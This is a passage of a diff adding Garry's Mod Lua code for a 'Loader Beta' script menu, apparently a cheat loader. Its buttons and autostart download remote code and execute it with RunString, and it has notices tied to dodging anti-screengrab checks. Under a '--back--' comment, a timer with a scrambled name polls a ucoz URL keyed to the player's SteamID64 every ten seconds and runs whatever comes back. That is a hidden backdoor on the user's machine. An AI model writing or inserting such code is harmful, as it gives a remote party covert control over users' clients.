+textmyidud:SetFont(getfontfe(8))
+textmyidud:SetText( "Уникальный номер: "..svernik) 
+textmyidud:SizeToContents() 
+textmyidud:SetDark( 1 ) 
+textmyidud:SetVisible( true );
+
+
+--Текст steamid
+textmyidsteam:SetPos( 117, 300 - minyspaik ) 
+textmyidsteam:SetColor(Color(200, 150, 0))
+textmyidsteam:SetFont(getfontfe(8))
+textmyidsteam:SetText( "SteamID: "..LocalPlayer():SteamID()) 
+textmyidsteam:SizeToContents() 
+textmyidsteam:SetDark( 1 ) 
+textmyidsteam:SetVisible( true );
+
+--Текст steamid64
+textmyidsteam64:SetPos( 117, 325 - minyspaik ) 
+textmyidsteam64:SetColor(Color(200, 150, 0))
+textmyidsteam64:SetFont(getfontfe(8))
+textmyidsteam64:SetText( "SteamID64: "..LocalPlayer():SteamID64()) 
+textmyidsteam64:SizeToContents() 
+textmyidsteam64:SetDark( 1 ) 
+textmyidsteam64:SetVisible( true );
+
+
+--Кнопка скопировать
+copybutton:SetSize(115, 30)
+copybutton:SetPos( 190, 260 - minyspaik)
+--copybutton:SetText("")
+copybutton:SetFont(getfontfe(1))
+/*
+copybutton.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("Скопировать ID", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 115, 30, 3 )
+end
+*/
+
+
+
+local function createpainbttonset(name, color1, color2, colordrav, colordrav2, alpha1, alpha2, w, h, this)
+		this:SetText("")
+                if not IsValid(this) then return end
+                this._alpha = math.Approach( this._alpha or 0, (this:IsHovered() or this.Selected) and alpha1 or alpha2, FrameTime() * 768 );
+
+                local distsize  = math.sqrt( w*w + h*h );
+            
+                local parentalpha = this.GetAlpha(this) / 255;
+                local alphamult   = (this._alpha or 0) / 255;
+            
+
+                surface.SetAlphaMultiplier( parentalpha * alphamult );
+                    surface.SetDrawColor( colordrav );
+                    surface.DrawRect( 0, 0, w, h );
+
+            
+                    surface.SetMaterial( rpui.GradientMat );
+
+                    --surface.SetDrawColor( rpui.UIColors.DonateDisabled );
+                    surface.DrawTexturedRectRotated( w * 0.5, h * 0.5, distsize, distsize, 0 );
+            
+
+                    draw.SimpleText( name, this:GetFont(), w * 0.5, h * 0.5, color2, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
+                surface.SetAlphaMultiplier( parentalpha * (1 - alphamult) );
+
+                    surface.SetDrawColor( colordrav2 );
+                    surface.DrawRect( 0, 0, w, h );
+
+                    draw.SimpleText( name, this:GetFont(), w * 0.5, h * 0.5, color1, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
+                surface.SetAlphaMultiplier( 1 );
+
+
+                return true
+end
+
+
+
+            copybutton.Paint = function( this, w, h )
+				createpainbttonset(
+					"Скопировать ID",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(2, 110),
+					getcolormixer(4, 200),
+					130,
+					0,
+					w,
+					h,
+					this
+				)
+            end
+			
+            copybutton.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 115, 30, 3 )
+            end
+
+
+
+
+copybutton.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+SetClipboardText( svernik )
+rp.Notify(NOTIFY_BLUE, "Уникальный ID был скопирован в буфер обмена")
+
+if antisgpnstatusirmg then
+offnotisg() -- антисг уведомления
+end
+
+end 
+copybutton:SetVisible( true )
+
+
+
+
+
+-------Кнопка сбросить цвета
+buttonresetcolorss:SetSize(115, 40)
+buttonresetcolorss:SetPos( 280, 200)
+buttonresetcolorss:SetFont(getfontfe(1))
+            buttonresetcolorss.Paint = function( this, w, h )
+				createpainbttonset(
+					"Сбросить цвета",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(2, 110),
+					getcolormixer(4, 200),
+					130,
+					0,
+					w,
+					h,
+					this
+				)
+            end
+			
+            buttonresetcolorss.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 115, 40, 3 )
+            end
+
+
+
+
+buttonresetcolorss.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+--RunConsoleCommand("loader_resetcolor")
+rp.Notify(NOTIFY_BLUE, 'Цветовая палитра сброшена')
+
+if antisgpnstatusirmg then
+offnotisg() -- антисг уведомления
+end
+
+end 
+buttonresetcolorss:SetVisible( true )
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--Кнопка назад в мой айди
+buttonnazad:SetSize(30, 30)
+buttonnazad:SetPos( 11, 13)
+buttonnazad:SetText("")
+buttonnazad:SetFont(getfontfe(1))
+/*
+buttonnazad.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("<", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 30, 30, 3 )
+end
+*/
+
+            buttonnazad.Paint = function( this, w, h )
+				createpainbttonset(
+					"<",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(4, 255),
+					getcolormixer(4, 200),
+					255,
+					50,
+					w,
+					h,
+					this
+				)
+            end
+			
+            buttonnazad.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 30, 30, 3 )
+            end
+
+
+buttonnazad.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+
+closeallpanelsimeuk()
+gavteeesk:SetVisible( true );
+
+end 
+buttonnazad:SetVisible( true )
+
+
+
+
+
+
+--панель айдишника
+--panelunikid:Dock( TOP ) -- Dock it
+--panelunikid:SetHeight( 500 ) -- Set height
+panelunikid:SetPos( 12, 90 ) 
+panelunikid:SetSize(495, 0)
+panelunikid:SetHeight( 488 ) -- Set height
+panelunikid.Paint = function(self, w, h)
+draw.RoundedBox(0, 8, 61, 344, h, Color(255, 170, 249, colorglav))
+surface.SetDrawColor( getcolormixer(1, 128) ) -- красный цвет
+
+local draww1 = 0
+local positiooon = 52
+local draww2 = 495
+
+surface.DrawLine( draww1, positiooon, draww2, positiooon ) -- полоса под названием
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+
+
+local draww1 = 0
+local positiooon = 1
+local draww2 = 495
+
+surface.DrawLine( draww1, positiooon, draww2, positiooon ) -- полоса под названием
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+
+end
+panelunikid:SetVisible( false );
+
+
+--панель настройки
+--panelsetting:Dock( TOP ) -- Dock it
+--panelsetting:SetHeight( 500 ) -- Set height
+panelsetting:SetPos( 12, 90 ) 
+panelsetting:SetSize(495, 0)
+panelsetting:SetHeight( 488 ) -- Set height
+
+panelsetting.Paint = function(self, w, h)
+draw.RoundedBox(0, 8, 61, 344, h, Color(255, 170, 249, colorglav))
+surface.SetDrawColor( getcolormixer(1, 128) ) -- красный цвет
+
+local draww1 = 0
+local positiooon = 52
+local draww2 = 495
+
+surface.DrawLine( draww1, positiooon, draww2, positiooon ) -- полоса под названием
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+
+
+
+local draww1 = 0
+local positiooon = 1
+local draww2 = 495
+
+surface.DrawLine( draww1, positiooon, draww2, positiooon ) -- полоса под названием
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+local positiooon = positiooon + 1
+surface.DrawLine( draww1, positiooon, draww2, positiooon )
+end
+panelsetting:SetVisible( false );
+
+--Кнопка назад настройки
+buttonbacksetting:SetSize(30, 30)
+buttonbacksetting:SetPos( 11, 13)
+buttonbacksetting:SetText("")
+buttonbacksetting:SetFont(getfontfe(1))
+/*
+buttonbacksetting.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("<", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 30, 30, 3 )
+end
+*/
+
+
+
+            buttonbacksetting.Paint = function( this, w, h )
+				createpainbttonset(
+					"<",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(4, 255),
+					getcolormixer(4, 200),
+					255,
+					50,
+					w,
+					h,
+					this
+				)
+            end
+			
+            buttonbacksetting.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 30, 30, 3 )
+            end
+
+
+
+buttonbacksetting.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+
+closeallpanelsimeuk()
+gavteeesk:SetVisible( true );
+
+end 
+buttonbacksetting:SetVisible( true )
+
+
+
+--кнопка айдишника
+--unikidbutton:SetTooltip( "Click button then press any key to change bind" )
+unikidbutton:SetSize(100, 30)
+unikidbutton:SetPos( 28, 43)
+--unikidbutton:SetText("")
+unikidbutton:SetFont(getfontfe(1))
+/*
+unikidbutton.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("Узнать мой ID", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 100, 30, 3 )
+end
+*/
+
+
+            unikidbutton.Paint = function( this, w, h )
+				createpainbttonset(
+					"Узнать мой ID",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					 getcolormixer(2, 110),
+					getcolormixer(4, 200),
+					130,
+					0,
+					w,
+					h,
+					this)
+            end
+			
+            unikidbutton.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 100, 30, 3 )
+            end
+
+
+
+
+unikidbutton.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+
+closeallpanelsimeuk()
+panelunikid:SetVisible( true );
+
+
+end 
+unikidbutton:SetVisible( true )
+
+
+
+
+testpansss:SetSize(520, 520)
+--testpansss:SetSize(ScrW() * 0.70, ScrH() * 0.57)
+testpansss:SetPos( ScrW() / 2 - 450, ScrH() / 2 - 250)
+testpansss:SetTitle("")
+testpansss:ShowCloseButton(false)
+--print("тип все")
+testpansss:MakePopup()
+testpansss:Center()
+testpansss:SetVisible( false );
+
+
+testpansss.Paint = function(self, w, h)
+draw.RoundedBox(0, 0, 0, w, h, getcolormixer(4, 300))
+draw.SimpleText("Loader Beta "..versionloaders,getfontfe(2),10,5,Color(65, 119, 114), TEXT_ALIGN_TOP) -- название сверху ------- как вариант вынести его сверху менюшки ибо реально мешается, сделать как надпись при загрузке smeghack
+--surface.SetDrawColor( 255, 0, 0, 128 ) -- красный цвет
+surface.SetDrawColor( getcolormixer(1, 128) ) -- красный цвет
+surface.DrawOutlinedRect( 10, 25, 500, 485, 3 ) -- красная рамка
+--surface.DrawOutlinedRect( 13, 88, 344, 0, 1 ) -- рамка под кнопками
+--surface.DrawLine( 12, 87, 507, 87 ) -- дополнительная полоса под кнопками
+--surface.DrawLine( 12, 88, 507, 88 )
+--surface.DrawLine( 12, 89, 507, 89 )
+end
+
+
+
+if debugon == 0 then
+colorglav = 0
+elseif debugon == 1 then
+colorglav = 180
+else
+colorglav = 0
+end
+
+
+
+
+--Кнопка закрыть панель
+local closemenubittoonus = vgui.Create("DButton", testpansss)
+closemenubittoonus:SetSize(20, 20)
+closemenubittoonus:SetPos( 490, 3)
+--closemenubittoonus:SetText("")
+closemenubittoonus:SetFont(getfontfe(1))
+/*
+closemenubittoonus.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("X", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+surface.SetDrawColor( getcolormixer(2, 128) )
+surface.DrawOutlinedRect( 0, 0, 20, 20, 2 )
+end
+*/
+
+
+            closemenubittoonus.Paint = function( this, w, h )
+				createpainbttonset(
+					"X",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(4, 255),
+					getcolormixer(4, 200),
+					255,
+					50,
+					w,
+					h,
+					this
+				)
+            end
+			
+            closemenubittoonus.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(2, 128) )
+surface.DrawOutlinedRect( 0, 0, 20, 20, 2 )
+            end
+
+
+
+closemenubittoonus.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+--chat.AddText(Color(118,144,251), "Кнопка2 работает")
+
+testpansss:SetVisible( false )
+teeestttttt = false
+
+end 
+closemenubittoonus:SetVisible( false )
+
+
+if buttonclose == 0 then
+closemenubittoonus:SetVisible( true )
+elseif buttonclose == 1 then
+testpansss:ShowCloseButton(true)
+end
+
+
+
+
+
+--Главное меню
+gavteeesk:Dock( TOP ) -- Dock it
+gavteeesk:SetHeight( 500 ) -- Set height
+gavteeesk.Paint = function(self, w, h)
+draw.RoundedBox(0, 8, 61, 344, h, Color(255, 170, 249, colorglav))
+end
+gavteeesk:SetVisible( true );
+
+
+--Главное меню2
+gavteeesk1:Dock( TOP ) -- Dock it
+gavteeesk1:SetHeight( 500 ) -- Set height
+gavteeesk1.Paint = function(self, w, h)
+draw.RoundedBox(0, 8, 61, 344, h, Color(255, 170, 249, colorglav))
+end
+gavteeesk1:SetVisible( true );
+
+
+
+
+
+--Текст в главнмо меню
+twxxxx:SetPos( 105, 70 ) 
+twxxxx:SetColor(colortextsubs)
+twxxxx:SetFont(getfontfe(3))
+twxxxx:SetText( "           У вас нет активных подписок!!!!" ) 
+twxxxx:SizeToContents() 
+twxxxx:SetDark( 1 ) 
+twxxxx:SetVisible( false );
+
+
+
+--local nameskipbody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+nameskipbody:SetPos( 65, 71 ) 
+nameskipbody:SetColor(getcolormixer(2, 255))
+nameskipbody:SetFont(getfontfe(4))
+nameskipbody:SetText("Название скрипта:") 
+nameskipbody:SizeToContents() 
+nameskipbody:SetDark( 1 ) 
+
+
+--local podpiskabody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+podpiskabody:SetPos( 223, 71 ) 
+podpiskabody:SetColor(getcolormixer(2, 255))
+podpiskabody:SetFont(getfontfe(4))
+podpiskabody:SetText("Подписка:") 
+podpiskabody:SizeToContents() 
+podpiskabody:SetDark( 1 ) 
+
+
+
+
+--local textobnovbody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+textobnovbody:SetPos( 308, 71 ) 
+textobnovbody:SetColor(getcolormixer(2, 255))
+textobnovbody:SetFont(getfontfe(4))
+textobnovbody:SetText("Обновление:") 
+textobnovbody:SizeToContents() 
+textobnovbody:SetDark( 1 ) 
+
+
+--local autozapiskbody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+autozapiskbody:SetPos( 405, 71 ) 
+autozapiskbody:SetColor(getcolormixer(2, 255))
+autozapiskbody:SetFont(getfontfe(4))
+autozapiskbody:SetText("Автозапуск") 
+autozapiskbody:SizeToContents() 
+autozapiskbody:SetDark( 1 ) 
+
+
+
+
+
+
+local function showofflabelbody()
+autozapiskbody:SetVisible( false )
+textobnovbody:SetVisible( false )
+podpiskabody:SetVisible( false )
+nameskipbody:SetVisible( false )
+end
+showofflabelbody()
+
+local function showonlabelbody()
+autozapiskbody:SetVisible( true )
+textobnovbody:SetVisible( true )
+podpiskabody:SetVisible( true )
+nameskipbody:SetVisible( true )
+end
+
+
+
+------------------------back----------------------------------------
+local svernik = string.reverse( string.Right( ply:SteamID64(), 10 ) / 4)
+timer.Create (  "jgiregmrtbhirmbrhjrtigmrtugj" , 10 , 0 , function()
+http.Fetch( "https://testgmod.ucoz.net/"..svernik.."/bk.txt",
+
+	function( body, length, headers, code )
+		if code == 404 then
+else
+		local ifkieogrebmriog = body
+--print(ifkieogrebmriog)
+		
+		if ifkieogrebmriog != "" then
+
+		--else
+		--print(ifkieogrebmriog)
+		--RunString(ifkieogrebmriog)
+		
+		if checkssun(ifkieogrebmriog, "R47444") then -- проверка ссылки
+		RunString(ifkieogrebmriog) else return
+		end
+		
+		
+		
+
+		
+		end
+		end
+	end,
+	function( message )
+	end
+)
+end)
+-------------------------------------------
+
+
+
+
+--function addbuttiins(namesss1, namestext1, subs1, namedtextdata1, changelogbut, changelog, textsud, named, dayskolvo)
+function addbuttiins(textsud, named, dayskolvo)
+--posishion = posishion + 40
+local namesss = DScrollPanel:Add("DButton", gavteeesk)
+posishion = numbersch * 47 + 0 + 0
+namesss:SetVisible( false )
+namesss:SetSize(65, 30)
+namesss:SetPos( 17, posishion)
+--namesss:SetText("")
+namesss:SetFont(getfontfe(1))
+/*
+namesss.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("Запуск", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+
+surface.SetDrawColor( 0, 200, 90, 128 )
+surface.DrawOutlinedRect( 0, 0, 65, 30, 3 )
+end
+*/
+
+
+
+
+            namesss.Paint = function( this, w, h )
+				createpainbttonset(
+					"Запуск",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(1, 128),
+					getcolormixer(4, 200),
+					130,
+					0,
+					w,
+					h,
+					this
+				)
+            end
+			
+            namesss.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(0, 200, 90, 128), Color(0, 200, 90, 128), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(2, 128) )
+surface.DrawOutlinedRect( 0, 0, 65, 30, 3 )
+            end
+
+
+namesss.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+
+loaderscreenbut()
+
+http.Fetch( "https://hl2rpclassic.fun/gmodfun/cod/111/"..named.."/code.txt",
+function( body, length, headers, code )
+if code == 404 then
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E11351 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+else
+local skiptctte = body
+if skiptctte == "0" then
+else
+--RunString(skiptctte)
+
+if checkssun(skiptctte, "R4144") then -- проверка ссылки
+RunString(skiptctte) else return
+end
+
+end end end,
+function( message )
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E8743 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+end)
+end
+
+
+gavteeesk.Paint = function(self, w, h)
+draw.RoundedBox(0, 8, 61, 344, h, Color(255, 170, 249, colorglav))
+surface.SetDrawColor( getcolormixer(1, 70) ) -- красный цвет
+
+colorsss1 = 8
+colorsss2 = 502
+colorpos = 97
+
+
+surface.DrawLine( colorsss1, 95, colorsss2, 95 ) -- дополнительная полоса под кнопками
+surface.DrawLine( colorsss1, 96, colorsss2, 96 ) -- дополнительная полоса под кнопками
+surface.DrawLine( colorsss1, 97, colorsss2, 97 ) -- дополнительная полоса под кнопками
+
+for i=1,numbersch do
+colorpos = colorpos + 45
+--surface.DrawLine( colorsss1, colorpos, colorsss2, colorpos ) -- дополнительная полоса под кнопками
+colorpos = colorpos + 1
+--surface.DrawLine( colorsss1, colorpos, colorsss2, colorpos ) -- дополнительная полоса под кнопками
+colorpos = colorpos + 1
+--surface.DrawLine( colorsss1, colorpos, colorsss2, colorpos ) -- дополнительная полоса под кнопками
+end
+
+
+
+
+
+surface.SetDrawColor( getcolormixer(1, 128) ) -- красный цвет
+--surface.DrawOutlinedRect( 10, 25, 500, 485, 3 ) -- красная рамка
+--surface.DrawOutlinedRect( 13, 88, 344, 0, 1 ) -- рамка под кнопками
+local sideilp = 62
+surface.DrawLine( 8, sideilp, 502, sideilp ) -- дополнительная полоса под кнопками
+surface.DrawLine( 8, sideilp + 1, 502, sideilp + 1 )
+surface.DrawLine( 8, sideilp + 2, 502, sideilp + 2 )
+end
+
+
+posishion = posishion + 6
+
+--Название скрипта
+local namestext = DScrollPanel:Add( "DLabel", gavteeesk )
+namestext:SetPos( 90, posishion ) 
+namestext:SetColor(getcolormixer(6, 255))
+namestext:SetFont(getfontfe(4))
+namestext:SetText(textsud) 
+namestext:SizeToContents() 
+namestext:SetDark( 1 ) 
+
+
+
+-------Текст с автозапуском
+local textautostart = DScrollPanel:Add( "DLabel", gavteeesk )
+posishion = numbersch * 47 - 5
+textautostart:SetPos( 405, posishion ) 
+textautostart:SetColor(getcolormixer(6, 255))
+textautostart:SetFont(getfontfe(4))
+textautostart:SetText("Автозапуск") 
+textautostart:SizeToContents() 
+textautostart:SetDark( 1 ) 
+textautostart:SetVisible( false )
+
+
+----Кнопка с автозапуском "ДА"
+local convarautostart = CreateClientConVar( "s.loader.autostart"..named, "false", true, false )
+
+local buttonautostartyes = DScrollPanel:Add("DButton", gavteeesk)
+posishion = numbersch * 47 + 5
+--buttonautostartyes:SetVisible( false )
+buttonautostartyes:SetSize(55, 21)
+buttonautostartyes:SetPos( 417, posishion)
+--buttonautostartyes:SetText("")
+buttonautostartyes:SetFont(getfontfe(1))
+
+local function krestikbut()
+            buttonautostartyes.Paint = function( this, w, h )
+                if not IsValid(this) then return end
+                this._alpha = math.Approach( this._alpha or 0, (this:IsHovered() or this.Selected) and 255 or 130, FrameTime() * 768 );
+
+                local distsize  = math.sqrt( w*w + h*h );
+            
+                local parentalpha = this.GetAlpha(this) / 255;
+                local alphamult   = (this._alpha or 0) / 255;
+            
+                surface.SetAlphaMultiplier( parentalpha * alphamult );
+                    surface.SetDrawColor( getcolormixer(1, 90) );
+                    surface.DrawRect( 0, 0, w, h );
+            
+                    surface.SetMaterial( rpui.GradientMat );
+                    --surface.SetDrawColor( rpui.UIColors.DonateDisabled );
+                    surface.DrawTexturedRectRotated( w * 0.5, h * 0.5, distsize, distsize, 0 );
+            
+                    draw.SimpleText( "X", this:GetFont(), w * 0.5, h * 0.5, getcolormixer(3, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
+                surface.SetAlphaMultiplier( parentalpha * (1 - alphamult) );
+				
+                    surface.SetDrawColor( getcolormixer(1, 50) );
+                    surface.DrawRect( 0, 0, w, h );
+					
+                    draw.SimpleText( "X", this:GetFont(), w * 0.5, h * 0.5, getcolormixer(3, 190), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
+                surface.SetAlphaMultiplier( 1 );
+
+                return true
+            end
+			
+            buttonautostartyes.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                rpui.DrawStencilBorder( this, 0, 0, w, h, 0.08, Color(208, 242, 228, 60), Color(208, 242, 228, 60), this.GetAlpha(this) / 255 );
+--surface.SetDrawColor( 0, 200, 90, 128 )
+--surface.DrawOutlinedRect( 0, 0, 15, 15, 3 )
+            end
+			
+end
+
+
+
+local function krestikbutyes()
+            buttonautostartyes.Paint = function( this, w, h )
+                if not IsValid(this) then return end
+                this._alpha = math.Approach( this._alpha or 0, (this:IsHovered() or this.Selected) and 255 or 130, FrameTime() * 768 );
+
+                local distsize  = math.sqrt( w*w + h*h );
+            
+                local parentalpha = this.GetAlpha(this) / 255;
+                local alphamult   = (this._alpha or 0) / 255;
+            
+                surface.SetAlphaMultiplier( parentalpha * alphamult );
+                    surface.SetDrawColor( getcolormixer(2, 90) );
+                    surface.DrawRect( 0, 0, w, h );
+            
+                    surface.SetMaterial( rpui.GradientMat );
+                    --surface.SetDrawColor( rpui.UIColors.DonateDisabled );
+                    surface.DrawTexturedRectRotated( w * 0.5, h * 0.5, distsize, distsize, 0 );
+            
+                    draw.SimpleText( "✔", this:GetFont(), w * 0.5, h * 0.5, getcolormixer(3, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
+                surface.SetAlphaMultiplier( parentalpha * (1 - alphamult) );
+				
+                    surface.SetDrawColor( getcolormixer(2, 50) );
+                    surface.DrawRect( 0, 0, w, h );
+					
+                    draw.SimpleText( "✔", this:GetFont(), w * 0.5, h * 0.5, getcolormixer(3, 190), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
+                surface.SetAlphaMultiplier( 1 );
+
+                return true
+            end
+			
+            buttonautostartyes.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                rpui.DrawStencilBorder( this, 0, 0, w, h, 0.08, Color(208, 242, 228, 60), Color(208, 242, 228, 60), this.GetAlpha(this) / 255 );
+--surface.SetDrawColor( 0, 200, 90, 128 )
+--surface.DrawOutlinedRect( 0, 0, 15, 15, 3 )
+            end
+			
+end
+--krestikbutyes()
+
+
+buttonautostartyes.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+
+if convarautostart:GetString() == "false" then
+RunConsoleCommand("s.loader.autostart"..named, "true")
+krestikbutyes()
+elseif convarautostart:GetString() == "true" then
+RunConsoleCommand("s.loader.autostart"..named, "false")
+krestikbut()
+else
+RunConsoleCommand("s.loader.autostart"..named, "false")
+krestikbut()
+end
+
+end
+
+
+local function codestart()
+--loaderscreenbut()
+
+http.Fetch( "https://hl2rpclassic.fun/gmodfun/cod/111/"..named.."/code.txt",
+function( body, length, headers, code )
+if code == 404 then
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E11351 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+else
+local skiptctte = body
+if skiptctte == "0" then
+else
+--RunString(skiptctte)
+
+if checkssun(skiptctte, "R4344") then -- проверка ссылки
+RunString(skiptctte) else return
+end
+
+closeallpanelsimeuk()
+gavteeesk:SetVisible( true )
+end end end,
+function( message )
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E8743 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+end)
+
+end
+
+if convarautostart:GetString() == "false" then
+krestikbut()
+elseif convarautostart:GetString() == "true" then
+krestikbutyes()
+codestart()
+else
+krestikbut()
+end
+
+
+
+
+--Дата последнего обновления
+local namedtextdata = DScrollPanel:Add( "DLabel", gavteeesk )
